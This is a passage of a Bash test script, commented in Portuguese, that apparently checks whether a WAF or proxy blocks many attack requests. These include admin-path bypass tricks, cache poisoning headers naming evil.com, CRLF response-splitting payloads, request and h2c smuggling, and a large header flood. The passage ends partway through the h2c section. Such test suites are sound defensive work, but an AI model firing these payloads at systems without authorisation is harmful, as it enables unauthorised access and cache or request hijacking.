    test_curl "Param: /admin?foo=bar" "block" -A "$UA" -Lk "${URL}/admin?foo=bar"
    test_curl "Param: /admin?debug=1" "block" -A "$UA" -Lk "${URL}/admin?debug=1"
    test_curl "Param: /admin?bypass=true" "block" -A "$UA" -Lk "${URL}/admin?bypass=true"
    test_curl "Fragment: /admin?foo=bar#" "block" -A "$UA" -Lk "${URL}/admin?foo=bar#"
    
    print_subsection "Case Manipulation"
    test_curl "Case: /Admin" "block" -A "$UA" -Lk "${URL}/Admin"
    test_curl "Case: /ADMIN" "block" -A "$UA" -Lk "${URL}/ADMIN"
    test_curl "Case: /aDmIn" "block" -A "$UA" -Lk "${URL}/aDmIn"
    test_curl "Case: /Wp-Admin" "block" -A "$UA" -Lk "${URL}/Wp-Admin"
    test_curl "Case: /WP-ADMIN" "block" -A "$UA" -Lk "${URL}/WP-ADMIN"
    
    print_subsection "Trailing Slash e Dot"
    test_curl "Trailing Slash: /admin/" "block" -A "$UA" -Lk "${URL}/admin/"
    test_curl "Trailing Dot: /admin." "block" -A "$UA" -Lk "${URL}/admin."
    test_curl "Double Trailing Slash: /admin//" "block" -A "$UA" -Lk "${URL}/admin//"
    test_curl "Trailing Dot+Slash: /admin./" "block" -A "$UA" -Lk "${URL}/admin./"
    
    print_subsection "Path Confusion (..;/ e similares)"
    test_curl "Path Confusion: /..;/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/admin"
    test_curl "Path Confusion: /;/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/;/admin"
    test_curl "Path Confusion: /.;/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/.;/admin"
    test_curl "Path Confusion: /./admin" "block" -A "$UA" -Lk --path-as-is "${URL}/./admin"
    test_curl "Path Confusion: /admin/." "block" -A "$UA" -Lk --path-as-is "${URL}/admin/."
    
    print_subsection "Double Slashes e Multiple Slashes"
    test_curl "Double Slash: //admin" "block" -A "$UA" -Lk "${URL}//admin"
    test_curl "Double Slash: //admin//" "block" -A "$UA" -Lk "${URL}//admin//"
    test_curl "Triple Slash: ///admin" "block" -A "$UA" -Lk "${URL}///admin"
    test_curl "Multiple Slash: ////admin////" "block" -A "$UA" -Lk "${URL}////admin////"
    
    print_subsection "URL Encoding Bypass"
    test_curl "Encoded Slash: /admin%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%2f"
    test_curl "Encoded Slash: /%2fadmin" "block" -A "$UA" -Lk --path-as-is "${URL}/%2fadmin"
    test_curl "Double Encoded: /admin%252f" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%252f"
    test_curl "Encoded Dot: /admin%2e" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%2e"
    test_curl "Encoded a: /%61dmin" "block" -A "$UA" -Lk --path-as-is "${URL}/%61dmin"
    
    print_subsection "Random Extension Append"
    test_curl "Extension: /admin.php" "block" -A "$UA" -Lk "${URL}/admin.php"
    test_curl "Extension: /admin.json" "block" -A "$UA" -Lk "${URL}/admin.json"
    test_curl "Extension: /admin.html" "block" -A "$UA" -Lk "${URL}/admin.html"
    test_curl "Extension: /admin.xml" "block" -A "$UA" -Lk "${URL}/admin.xml"
    test_curl "Extension: /admin.aspx" "block" -A "$UA" -Lk "${URL}/admin.aspx"
    
    print_subsection "Backslash e Mixed Slashes"
    test_curl "Backslash: \\admin" "block" -A "$UA" -Lk --path-as-is "${URL}/\\admin"
    test_curl "Mixed: /admin\\" "block" -A "$UA" -Lk --path-as-is "${URL}/admin\\"
    test_curl "Mixed: /admin\\/" "block" -A "$UA" -Lk --path-as-is "${URL}/admin\\/"
    test_curl "Mixed: \\/admin" "block" -A "$UA" -Lk --path-as-is "${URL}\\/admin"
    
    print_subsection "Trailing Semicolon e Space"
    test_curl "Semicolon: /admin;" "block" -A "$UA" -Lk --path-as-is "${URL}/admin;"
    test_curl "Semicolon: /admin;.js" "block" -A "$UA" -Lk --path-as-is "${URL}/admin;.js"
    test_curl "Encoded Space: /admin%20" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%20"
    test_curl "Tab: /admin%09" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%09"
    
    print_subsection "Unicode Tricks"
    test_curl "Unicode Slash: /admin%c0%af" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%c0%af"
    test_curl "Unicode Slash: /admin%ef%bc%8f" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%ef%bc%8f"
    test_curl "Unicode Dot: /admin%c0%ae" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%c0%ae"
    test_curl "Fullwidth: /admin／" "block" -A "$UA" -Lk "${URL}/admin／"
    test_curl "Fullwidth Path: ／admin" "block" -A "$UA" -Lk "${URL}/／admin"
    
    print_subsection "Path Normalization Bypass"
    test_curl "Dot-Dot: /admin/../admin" "block" -A "$UA" -Lk "${URL}/admin/../admin"
    test_curl "Dot-Dot-Dot: /admin/.../admin" "block" -A "$UA" -Lk --path-as-is "${URL}/admin/.../admin"
    test_curl "Current Dir: /./././admin" "block" -A "$UA" -Lk "${URL}/./././admin"
    test_curl "Mixed: /foo/../admin" "block" -A "$UA" -Lk "${URL}/foo/../admin"
    
    print_subsection "Special Characters in Path"
    test_curl "Hash: /admin#" "block" -A "$UA" -Lk "${URL}/admin#"
    test_curl "Question: /admin?" "block" -A "$UA" -Lk "${URL}/admin?"
    test_curl "Ampersand: /admin&" "block" -A "$UA" -Lk --path-as-is "${URL}/admin&"
    test_curl "Equals: /admin=" "block" -A "$UA" -Lk --path-as-is "${URL}/admin="
    test_curl "Plus: /admin+" "block" -A "$UA" -Lk "${URL}/admin+"
    
    print_subsection "Path Fuzzing & Encoding (%2e = dot)"
    test_curl "Encoded ..: /%2e%2e/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e/admin"
    test_curl "Encoded ..: /%2e%2e/%2e%2e/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e/%2e%2e/admin"
    test_curl "Mixed: /..%2fadmin" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2fadmin"
    test_curl "GET: /../admin/" "block" -A "$UA" -Lk -X GET "${URL}/../admin/"
    test_curl "GET path-as-is: /../admin/" "block" -A "$UA" -Lk -X GET --path-as-is "${URL}/../admin/"
    test_curl "Triple ..: /...%2f...%2fadmin" "block" -A "$UA" -Lk --path-as-is "${URL}/...%2f...%2fadmin"
    test_curl "Overlong UTF-8 dot: /%c0%2e%c0%2e/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/%c0%2e%c0%2e/admin"
    
    print_subsection "HTTP/HTTPS Protocol Switch"
    # Extrair host da URL para testar protocolo alternativo
    local host_part
    host_part=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
    if [[ "$URL" == https://* ]]; then
        test_curl "HTTP (sem TLS): /admin" "block" -A "$UA" -Lk "http://${host_part}/admin"
        test_curl "HTTP (sem TLS): /private" "block" -A "$UA" -Lk "http://${host_part}/private"
        test_curl "HTTP (sem TLS): /wp-admin" "block" -A "$UA" -Lk "http://${host_part}/wp-admin"
    else
        test_curl "HTTPS: /admin" "block" -A "$UA" -Lk "https://${host_part}/admin"
        test_curl "HTTPS: /private" "block" -A "$UA" -Lk "https://${host_part}/private"
        test_curl "HTTPS: /wp-admin" "block" -A "$UA" -Lk "https://${host_part}/wp-admin"
    fi
    
    print_subsection "Portas Alternativas"
    local base_host
    base_host=$(echo "$host_part" | sed -E 's|:[0-9]+$||')
    local protocol
    [[ "$URL" == https://* ]] && protocol="https" || protocol="http"
    test_curl "Porta 8080: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:8080/admin" 2>/dev/null || true
    test_curl "Porta 8443: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "https://${base_host}:8443/admin" 2>/dev/null || true
    test_curl "Porta 8000: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:8000/admin" 2>/dev/null || true
    test_curl "Porta 3000: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:3000/admin" 2>/dev/null || true
    test_curl "Porta 9000: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:9000/admin" 2>/dev/null || true
    
    print_subsection "Subdomínios Alternativos (via Host header)"
    test_curl "Subdomain: admin.host" "block" -A "$UA" -Lk -H "Host: admin.${base_host}" "${URL}/admin"
    test_curl "Subdomain: dev.host" "block" -A "$UA" -Lk -H "Host: dev.${base_host}" "${URL}/admin"
    test_curl "Subdomain: api.host" "block" -A "$UA" -Lk -H "Host: api.${base_host}" "${URL}/admin"
    test_curl "Subdomain: staging.host" "block" -A "$UA" -Lk -H "Host: staging.${base_host}" "${URL}/admin"
    test_curl "Subdomain: internal.host" "block" -A "$UA" -Lk -H "Host: internal.${base_host}" "${URL}/admin"
}

#==============================================================================
# HTTP PROTOCOL VERSION TESTS (HTTP/1.0, HTTP/1.1, HTTP/2, HTTP/3)
#==============================================================================
test_http_protocols() {
    print_section "🌐 TESTES DE VERSÕES DE PROTOCOLO HTTP (20 testes)"
    
    print_subsection "HTTP/1.0 (Legacy - deve ser bloqueado ou limitado)"
    # HTTP/1.0 é considerado obsoleto e pode ser bloqueado por segurança
    test_curl "HTTP/1.0: GET request" "block" -A "$UA" -Lk --http1.0 "$URL"
    test_curl "HTTP/1.0: HEAD request" "block" -A "$UA" -Lk --http1.0 -X HEAD "$URL"
    test_curl "HTTP/1.0: POST request" "block" -A "$UA" -Lk --http1.0 -X POST "$URL"
    test_curl "HTTP/1.0: sem Host header" "block" -A "$UA" -Lk --http1.0 -H "Host:" "$URL"
    
    print_subsection "HTTP/1.1 (Padrão - deve funcionar)"
    test_curl "HTTP/1.1: GET request" "allow" -A "$UA" -Lk --http1.1 "$URL"
    test_curl "HTTP/1.1: HEAD request" "allow" -A "$UA" -Lk --http1.1 -X HEAD "$URL"
    test_curl "HTTP/1.1: POST request" "allow" -A "$UA" -Lk --http1.1 -X POST "$URL"
    test_curl "HTTP/1.1: com Keep-Alive" "allow" -A "$UA" -Lk --http1.1 -H "Connection: keep-alive" "$URL"
    
    print_subsection "HTTP/2 (Moderno - deve funcionar se suportado)"
    # Verificar se o servidor suporta HTTP/2
    local http2_supported
    http2_supported=$(curl -s -o /dev/null -w "%{http_version}" --http2 -Lk "$URL" 2>/dev/null || echo "0")
    if [[ "$http2_supported" == "2" ]]; then
        echo -e "  ${GREEN}ℹ️  HTTP/2 suportado pelo servidor${NC}"
        test_curl "HTTP/2: GET request" "allow" -A "$UA" -Lk --http2 "$URL"
        test_curl "HTTP/2: HEAD request" "allow" -A "$UA" -Lk --http2 -X HEAD "$URL"
        test_curl "HTTP/2: POST request" "allow" -A "$UA" -Lk --http2 -X POST "$URL"
        test_curl "HTTP/2: com multiplex headers" "allow" -A "$UA" -Lk --http2 -H "X-Custom: test" "$URL"
    else
        echo -e "  ${YELLOW}⚠️  HTTP/2 não suportado ou não detectado pelo servidor${NC}"
        # Testa se a conexão falha graciosamente ao forçar HTTP/2
        test_curl "HTTP/2: forçando conexão" "allow" -A "$UA" -Lk --http2 "$URL"
    fi
    
    # HTTP/2 prior knowledge (sem upgrade HTTP/1.1)
    test_curl "HTTP/2 prior knowledge" "allow" -A "$UA" -Lk --http2-prior-knowledge "$URL" 2>/dev/null || echo "  [?] HTTP/2 prior knowledge não suportado"
    
    print_subsection "HTTP/3 (QUIC - experimental)"
    # Verificar se curl foi compilado com suporte a HTTP/3
    local curl_http3_support
    curl_http3_support=$(curl --version 2>/dev/null | grep -i "http3\|quic" || echo "")
    
    if [[ -n "$curl_http3_support" ]]; then
        echo -e "  ${GREEN}ℹ️  curl com suporte a HTTP/3 detectado${NC}"
        local http3_supported
        http3_supported=$(curl -s -o /dev/null -w "%{http_version}" --http3 -Lk "$URL" 2>/dev/null || echo "0")
        if [[ "$http3_supported" == "3" ]]; then
            echo -e "  ${GREEN}ℹ️  HTTP/3 suportado pelo servidor${NC}"
            test_curl "HTTP/3: GET request" "allow" -A "$UA" -Lk --http3 "$URL"
            test_curl "HTTP/3: HEAD request" "allow" -A "$UA" -Lk --http3 -X HEAD "$URL"
            test_curl "HTTP/3: POST request" "allow" -A "$UA" -Lk --http3 -X POST "$URL"
        else
            echo -e "  ${YELLOW}⚠️  HTTP/3 não suportado pelo servidor${NC}"
            # Tenta fallback para HTTP/3 only
            test_curl "HTTP/3: tentativa de conexão" "allow" -A "$UA" -Lk --http3-only "$URL" 2>/dev/null || echo "  [SKIP] HTTP/3 only falhou (esperado se servidor não suporta)"
        fi
    else
        echo -e "  ${YELLOW}⚠️  curl não foi compilado com suporte a HTTP/3 (--http3)${NC}"
        echo -e "  ${YELLOW}   Instale curl-http3 ou compile curl com nghttp3 e ngtcp2${NC}"
    fi
    
    print_subsection "Testes de Segurança por Protocolo"
    # Testar ataques específicos por versão de protocolo
    test_curl "HTTP/1.0: Connection header" "block" -A "$UA" -Lk --http1.0 -H "Connection: keep-alive" "$URL"
    test_curl "HTTP/1.1: PUT method" "block" -A "$UA" -Lk --http1.1 -X PUT "$URL"
    test_curl "HTTP/1.1: DELETE method" "block" -A "$UA" -Lk --http1.1 -X DELETE "$URL"
    test_curl "HTTP/2: PUT method" "block" -A "$UA" -Lk --http2 -X PUT "$URL"
    test_curl "HTTP/2: TRACE method" "block" -A "$UA" -Lk --http2 -X TRACE "$URL"
    
    print_subsection "Protocol Downgrade Attacks"
    # Tentar forçar downgrade de protocolo
    test_curl "Downgrade: Upgrade header para HTTP/1.0" "block" -A "$UA" -Lk -H "Upgrade: HTTP/1.0" "$URL"
    test_curl "Downgrade: Connection: Upgrade" "block" -A "$UA" -Lk -H "Connection: Upgrade" -H "Upgrade: h2c" "$URL"
}

#==============================================================================
# HOP-BY-HOP HEADERS ABUSE (RFC 2616)
#==============================================================================
test_hop_by_hop_headers() {
    print_section "🔗 TESTES DE HOP-BY-HOP HEADERS ABUSE (25 testes)"
    
    print_subsection "Headers Hop-by-Hop Padrão"
    test_curl "HBH: Connection: close" "block" -A "$UA" -Lk -H "Connection: close, X-Foo" -H "X-Foo: bar" "$URL"
    test_curl "HBH: Connection com header custom" "block" -A "$UA" -Lk -H "Connection: X-Custom-Header" -H "X-Custom-Header: test" "$URL"
    test_curl "HBH: Keep-Alive manipulation" "block" -A "$UA" -Lk -H "Connection: Keep-Alive" -H "Keep-Alive: timeout=999999" "$URL"
    test_curl "HBH: Proxy-Connection" "block" -A "$UA" -Lk -H "Proxy-Connection: keep-alive" "$URL"
    test_curl "HBH: Proxy-Authenticate" "block" -A "$UA" -Lk -H "Proxy-Authenticate: Basic realm=test" "$URL"
    test_curl "HBH: Proxy-Authorization" "block" -A "$UA" -Lk -H "Proxy-Authorization: Basic YWRtaW46YWRtaW4=" "$URL"
    test_curl "HBH: TE header" "block" -A "$UA" -Lk -H "TE: trailers, deflate" "$URL"
    test_curl "HBH: Trailer header" "block" -A "$UA" -Lk -H "Trailer: X-Checksum" "$URL"
    test_curl "HBH: Upgrade header" "block" -A "$UA" -Lk -H "Upgrade: websocket" "$URL"
    
    print_subsection "Abusing Connection Header para Bypass"
    test_curl "HBH: Remover X-Forwarded-For" "block" -A "$UA" -Lk -H "Connection: X-Forwarded-For" -H "X-Forwarded-For: 127.0.0.1" "$URL"
    test_curl "HBH: Remover X-Real-IP" "block" -A "$UA" -Lk -H "Connection: X-Real-IP" -H "X-Real-IP: 192.168.1.1" "$URL"
    test_curl "HBH: Remover Authorization" "block" -A "$UA" -Lk -H "Connection: Authorization" -H "Authorization: Bearer token" "$URL"
    test_curl "HBH: Remover Cookie" "block" -A "$UA" -Lk -H "Connection: Cookie" --cookie "session=abc123" "$URL"
    test_curl "HBH: Remover X-Forwarded-Host" "block" -A "$UA" -Lk -H "Connection: X-Forwarded-Host" -H "X-Forwarded-Host: evil.com" "$URL"
    test_curl "HBH: Remover X-Forwarded-Proto" "block" -A "$UA" -Lk -H "Connection: X-Forwarded-Proto" -H "X-Forwarded-Proto: https" "$URL"
    
    print_subsection "Múltiplos Headers Hop-by-Hop"
    test_curl "HBH: Múltiplos em Connection" "block" -A "$UA" -Lk -H "Connection: close, X-Foo, X-Bar, Keep-Alive" "$URL"
    test_curl "HBH: Connection duplicado" "block" -A "$UA" -Lk -H "Connection: close" -H "Connection: keep-alive" "$URL"
    test_curl "HBH: Transfer-Encoding em Connection" "block" -A "$UA" -Lk -H "Connection: Transfer-Encoding" -H "Transfer-Encoding: chunked" "$URL"
    test_curl "HBH: Content-Length em Connection" "block" -A "$UA" -Lk -H "Connection: Content-Length" -H "Content-Length: 0" "$URL"
    
    print_subsection "Headers de Proxy Customizados"
    test_curl "HBH: X-Proxy-Connection" "block" -A "$UA" -Lk -H "X-Proxy-Connection: keep-alive" "$URL"
    test_curl "HBH: X-Forwarded-By" "block" -A "$UA" -Lk -H "X-Forwarded-By: evil-proxy" "$URL"
    test_curl "HBH: Via header manipulation" "block" -A "$UA" -Lk -H "Via: 1.1 evil-proxy.com" "$URL"
    test_curl "HBH: Forwarded header" "block" -A "$UA" -Lk -H "Forwarded: for=127.0.0.1;proto=http;by=evil-proxy" "$URL"
    test_curl "HBH: Max-Forwards zero" "block" -A "$UA" -Lk -H "Max-Forwards: 0" -X TRACE "$URL"
    test_curl "HBH: Max-Forwards negativo" "block" -A "$UA" -Lk -H "Max-Forwards: -1" "$URL"
}

#==============================================================================
# CACHE POISONING / CACHE DECEPTION
#==============================================================================
test_cache_poisoning() {
    print_section "💉 TESTES DE CACHE POISONING / CACHE DECEPTION (30 testes)"
    
    print_subsection "Cache Key Manipulation"
    test_curl "Cache: X-Forwarded-Host poisoning" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" "$URL"
    test_curl "Cache: X-Forwarded-Scheme" "block" -A "$UA" -Lk -H "X-Forwarded-Scheme: nothttps" "$URL"
    test_curl "Cache: X-Original-URL" "block" -A "$UA" -Lk -H "X-Original-URL: /admin" "$URL"
    test_curl "Cache: X-Rewrite-URL" "block" -A "$UA" -Lk -H "X-Rewrite-URL: /admin" "$URL"
    test_curl "Cache: X-Host" "block" -A "$UA" -Lk -H "X-Host: evil.com" "$URL"
    test_curl "Cache: X-Forwarded-Server" "block" -A "$UA" -Lk -H "X-Forwarded-Server: evil.com" "$URL"
    
    print_subsection "Unkeyed Headers Abuse"
    test_curl "Cache: X-Forwarded-Port" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 1337" "$URL"
    test_curl "Cache: X-Forwarded-SSL" "block" -A "$UA" -Lk -H "X-Forwarded-SSL: off" "$URL"
    test_curl "Cache: X-URL-Scheme" "block" -A "$UA" -Lk -H "X-URL-Scheme: http" "$URL"
    test_curl "Cache: Origin header" "block" -A "$UA" -Lk -H "Origin: https://evil.com" "$URL"
    test_curl "Cache: X-Custom-IP-Auth" "block" -A "$UA" -Lk -H "X-Custom-IP-Authorization: 127.0.0.1" "$URL"
    
    print_subsection "Fat GET Requests"
    test_curl "Cache: Fat GET com body" "block" -A "$UA" -Lk -X GET -d "admin=true" "$URL"
    test_curl "Cache: GET com Content-Type" "block" -A "$UA" -Lk -X GET -H "Content-Type: application/json" -d '{"admin":true}' "$URL"
    
    print_subsection "Cache Deception via Path"
    test_curl "Cache Deception: /profile.css" "block" -A "$UA" -Lk "${URL}/profile/settings.css"
    test_curl "Cache Deception: /profile.js" "block" -A "$UA" -Lk "${URL}/profile/settings.js"
    test_curl "Cache Deception: /profile.png" "block" -A "$UA" -Lk "${URL}/profile/settings.png"
    test_curl "Cache Deception: /api/user.css" "block" -A "$UA" -Lk "${URL}/api/user.css"
    test_curl "Cache Deception: path;.css" "block" -A "$UA" -Lk "${URL}/account;.css"
    test_curl "Cache Deception: path%2F.css" "block" -A "$UA" -Lk "${URL}/account%2F.css"
    test_curl "Cache Deception: /..%2f..%2f.css" "block" -A "$UA" -Lk "${URL}/..%2f..%2f.css"
    
    print_subsection "Response Splitting para Cache Poisoning"
    test_curl "Cache: CRLF em parâmetro" "block" -A "$UA" -Lk "${URL}?param=%0d%0aSet-Cookie:+admin=true"
    test_curl "Cache: Header injection" "block" -A "$UA" -Lk -H $'X-Inject: test\r\nX-Cache-Poisoned: true' "$URL"
    
    print_subsection "Cache Control Manipulation"
    test_curl "Cache: Cache-Control: no-cache bypass" "block" -A "$UA" -Lk -H "Cache-Control: no-cache, no-store, must-revalidate" "$URL"
    test_curl "Cache: Pragma: no-cache" "block" -A "$UA" -Lk -H "Pragma: no-cache" "$URL"
    test_curl "Cache: If-None-Match manipulation" "block" -A "$UA" -Lk -H "If-None-Match: *" "$URL"
    test_curl "Cache: If-Modified-Since futuro" "block" -A "$UA" -Lk -H "If-Modified-Since: Sun, 01 Jan 2099 00:00:00 GMT" "$URL"
    
    print_subsection "Vary Header Abuse"
    test_curl "Cache: Accept-Language switch" "block" -A "$UA" -Lk -H "Accept-Language: xx-EVIL" "$URL"
    test_curl "Cache: Accept-Encoding evil" "block" -A "$UA" -Lk -H "Accept-Encoding: evil-encoding" "$URL"
    test_curl "Cache: User-Agent variation" "block" -A "$UA" -Lk -A "EvilBot/1.0 CachePoisoning" "$URL"
}

#==============================================================================
# HTTP CONNECTION CONTAMINATION
#==============================================================================
test_connection_contamination() {
    print_section "🦠 TESTES DE HTTP CONNECTION CONTAMINATION (20 testes)"
    
    print_subsection "Connection State Pollution"
    test_curl "Contamination: Keep-Alive com dados extra" "block" -A "$UA" -Lk -H "Connection: keep-alive" -H "Keep-Alive: timeout=300, max=1000" "$URL"
    test_curl "Contamination: Content-Length: 0 + body" "block" -A "$UA" -Lk -H "Content-Length: 0" -d "hidden-data" "$URL"
    test_curl "Contamination: Chunked + CL" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Content-Length: 10" "$URL"
    
    print_subsection "Pipeline Pollution"
    test_curl "Contamination: Pipeline request" "block" -A "$UA" -Lk -H "Connection: keep-alive" -H "X-Pipeline-Test: 1" "$URL"
    test_curl "Contamination: Pipelined GET" "block" -A "$UA" -Lk --http1.1 -H "Connection: keep-alive" "$URL"
    
    print_subsection "Request Queue Poisoning"
    test_curl "Contamination: Host header mismatch" "block" -A "$UA" -Lk -H "Host: internal-server" "$URL"
    test_curl "Contamination: Multiple Host" "block" -A "$UA" -Lk -H "Host: target.com" -H "Host: evil.com" "$URL"
    test_curl "Contamination: X-Forwarded-Host poison" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" -H "Host: target.com" "$URL"
    
    print_subsection "Backend Connection Abuse"
    test_curl "Contamination: X-Backend-Server" "block" -A "$UA" -Lk -H "X-Backend-Server: internal:8080" "$URL"
    test_curl "Contamination: X-Real-Destination" "block" -A "$UA" -Lk -H "X-Real-Destination: http://internal/admin" "$URL"
    test_curl "Contamination: X-Upstream-Host" "block" -A "$UA" -Lk -H "X-Upstream-Host: localhost" "$URL"
    
    print_subsection "Response Queue Poisoning"
    test_curl "Contamination: Accept diferente" "block" -A "$UA" -Lk -H "Accept: application/x-malicious" "$URL"
    test_curl "Contamination: Accept-Charset exotic" "block" -A "$UA" -Lk -H "Accept-Charset: x-evil-charset" "$URL"
    
    print_subsection "Protocol Confusion"
    test_curl "Contamination: WebSocket upgrade parcial" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" "$URL"
    test_curl "Contamination: HTTP/2 upgrade malicioso" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" "$URL"
    test_curl "Contamination: CONNECT tunnel" "block" -A "$UA" -Lk -X CONNECT -H "Host: internal:22" "$URL"
    test_curl "Contamination: Expect: 100-continue" "block" -A "$UA" -Lk -H "Expect: 100-continue" -d "test" "$URL"
    test_curl "Contamination: Expect malformed" "block" -A "$UA" -Lk -H "Expect: 200-ok" "$URL"
    test_curl "Contamination: Transfer-Encoding: identity" "block" -A "$UA" -Lk -H "Transfer-Encoding: identity" "$URL"
}

#==============================================================================
# HTTP RESPONSE SMUGGLING / DESYNC
#==============================================================================
test_response_smuggling() {
    print_section "🔀 TESTES DE HTTP RESPONSE SMUGGLING / DESYNC (25 testes)"
    
    print_subsection "Response Splitting"
    test_curl "RSmuggling: CRLF em header" "block" -A "$UA" -Lk -H $'X-Test: value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>' "$URL"
    test_curl "RSmuggling: Header injection via param" "block" -A "$UA" -Lk "${URL}?test=%0d%0aHTTP/1.1%20200%20OK"
    test_curl "RSmuggling: Set-Cookie injection" "block" -A "$UA" -Lk "${URL}?x=%0d%0aSet-Cookie:%20admin=true"
    
    print_subsection "Response Queue Desync"
    test_curl "RSmuggling: CL.0 Desync" "block" -A "$UA" -Lk -H "Content-Length: 0" -X POST -d "" "$URL"
    test_curl "RSmuggling: TE.0 Desync" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -X POST -d "0\r\n\r\n" "$URL"
    test_curl "RSmuggling: H2.0 Desync" "block" -A "$UA" -Lk --http2 -X POST -H "Content-Length: 0" "$URL"
    
    print_subsection "Content-Length Desync"
    test_curl "RSmuggling: CL maior que body" "block" -A "$UA" -Lk -H "Content-Length: 1000" -d "small" "$URL"
    test_curl "RSmuggling: CL zero com body" "block" -A "$UA" -Lk -H "Content-Length: 0" -d "hidden" --http1.1 "$URL"
    test_curl "RSmuggling: CL negativo" "block" -A "$UA" -Lk -H "Content-Length: -50" "$URL"
    test_curl "RSmuggling: CL com espaços" "block" -A "$UA" -Lk -H "Content-Length:  100" "$URL"
    test_curl "RSmuggling: CL com tabs" "block" -A "$UA" -Lk -H $'Content-Length:\t100' "$URL"
    
    print_subsection "Chunked Encoding Desync"
    test_curl "RSmuggling: Chunk size malformado" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -d "ZZZ\r\ndata\r\n0\r\n\r\n" "$URL"
    test_curl "RSmuggling: Chunk extension" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -d "5;ext=val\r\nhello\r\n0\r\n\r\n" "$URL"
    test_curl "RSmuggling: Trailing headers" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Trailer: X-End" -d "5\r\nhello\r\n0\r\nX-End: value\r\n\r\n" "$URL"
    
    print_subsection "Browser Desync via Timeout"
    test_curl "RSmuggling: Slow headers" "block" -A "$UA" -Lk --speed-time 1 --speed-limit 1 "$URL" 2>/dev/null || true
    
    print_subsection "HTTP/2 Response Desync"
    test_curl "RSmuggling: H2 pseudo-header" "block" -A "$UA" -Lk --http2 -H ":authority: evil.com" "$URL" 2>/dev/null || true
    test_curl "RSmuggling: H2 CONTINUATION flood" "block" -A "$UA" -Lk --http2 -H "X-Long: $(head -c 16000 /dev/zero | tr '\0' 'A')" "$URL"
    
    print_subsection "Protocol Smuggling"
    test_curl "RSmuggling: HTTP/1.1 em HTTP/2" "block" -A "$UA" -Lk --http2 -H "Transfer-Encoding: chunked" "$URL"
    test_curl "RSmuggling: Via header abuse" "block" -A "$UA" -Lk -H "Via: HTTP/2.0 evil-proxy" "$URL"
    test_curl "RSmuggling: X-HTTP-Version" "block" -A "$UA" -Lk -H "X-HTTP-Version: 1.0" "$URL"
    
    print_subsection "Encoding Desync"
    test_curl "RSmuggling: Transfer-Encoding capitalizado" "block" -A "$UA" -Lk -H "Transfer-ENCODING: chunked" "$URL"
    test_curl "RSmuggling: TE com null byte" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked%00" "$URL"
    test_curl "RSmuggling: TE com vírgula" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked, identity" "$URL"
    test_curl "RSmuggling: TE múltiplo" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" "$URL"
}

#==============================================================================
# H2C SMUGGLING (HTTP/2 Cleartext)
#==============================================================================
test_h2c_smuggling() {
    print_section "🚀 TESTES DE H2C SMUGGLING (20 testes)"
    
    echo -e "  ${YELLOW}ℹ️  H2C permite upgrade de HTTP/1.1 para HTTP/2 sem TLS${NC}"
    echo -e "  ${YELLOW}   Pode ser usado para bypass de proxy e acesso a endpoints internos${NC}"
    echo ""
    
    print_subsection "H2C Upgrade Requests"
    test_curl "H2C: Upgrade básico" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" -H "Connection: Upgrade, HTTP2-Settings" "$URL"
    test_curl "H2C: Upgrade com prior knowledge" "block" -A "$UA" -Lk --http2-prior-knowledge "$URL" 2>/dev/null || true
    test_curl "H2C: Connection: Upgrade" "block" -A "$UA" -Lk -H "Connection: Upgrade" -H "Upgrade: h2c" "$URL"
    
    print_subsection "H2C via Diferentes Paths"
    test_curl "H2C: /admin endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/admin"
    test_curl "H2C: /internal endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/internal"
    test_curl "H2C: /api endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/api"
    test_curl "H2C: /metrics endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/metrics"
    test_curl "H2C: /health endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/health"
    
    print_subsection "H2C Settings Manipulation"
    test_curl "H2C: Settings vazio" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: " -H "Connection: Upgrade, HTTP2-Settings" "$URL"
